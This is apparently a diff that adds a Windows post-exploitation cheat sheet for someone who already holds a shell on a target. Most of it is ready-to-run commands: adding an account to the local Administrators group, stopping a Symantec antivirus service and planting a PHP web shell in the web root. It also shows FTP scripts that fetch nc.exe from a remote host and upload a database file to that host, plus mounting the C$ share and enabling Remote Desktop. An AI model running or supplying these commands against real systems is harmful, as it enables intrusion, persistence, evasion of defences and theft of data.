@@ -1,0 +1,42 @@
+This is a list of commands that can be useful when you have a shell on a Windows box and you want to do local discovery, escalate privileges and pivot (without using tools as Metasploit):
+
+View your current user:	whoami
+View information about the current user:	net user myuser(for a local user)
+net user myuser /domain (for a domain user)
+View the local groups:	net localgroup
+View the local administrators:	net localgroup Administrators
+Add a new user:	net user myuser mypass /add
+Add a user in the local Administrators group:	net localgroup Administrators myuser /add
+View the domain name of current machine:	net config workstation
+net config server
+View the name of the domain controller:	reg query "HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\ CurrentVersion\Group Policy\ History" /v DCName
+View the list of domain admins:	net group "Domain Admins" /domain
+View the list of started services (search for antivirus):	net start
+sc query
+Stop a service:	net stop "Symantec Endpoint Protection"
+View the list of started processes and the owner:	tasklist /v
+Kill a process by its name	taskkill /F /IM "cmd.exe"
+Abort a shutdown/restart countdown	shutdown /a
+Create php backdoor/shell	echo ^<?php echo passthru($_GET['cmd']); ?^> > C:\inetpub\wwwroot\s.php
+Download an executable from a remote FTP server	echo open 10.1.2.3> C:\script.txt
+echo user myftpuser>> C:\script.txt
+echo pass myftppass>> C:\script.txt
+echo get nc.exe>> C:\script.txt
+echo bye>> C:\script.txt
+ftp -s:script.txt
+Upload a file to a remote FTP server	echo open 10.1.2.3> C:\script.txt
+echo user myftpuser>> C:\script.txt
+echo pass myftppass>> C:\script.txt
+echo put E:\backups\database.dbf>> C:\script.txt
+echo bye>> C:\script.txt
+ftp -s:script.txt
+View established connections of current machine:	netstat -a -n -p tcp | find "ESTAB"
+View open ports of current machine:	netstat -a -n -p tcp | find "LISTEN"
+netstat -a -n -p udp
+View network configuration:	netsh interface ip show addresses
+netsh interface ip show route
+netsh interface ip show neighbors
+View current network shares:	net share
+Mount a remote share with the rights of the current user:	net use K: \\10.1.2.3\C$
+dir K:
+Enable Remote Desktop:	reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
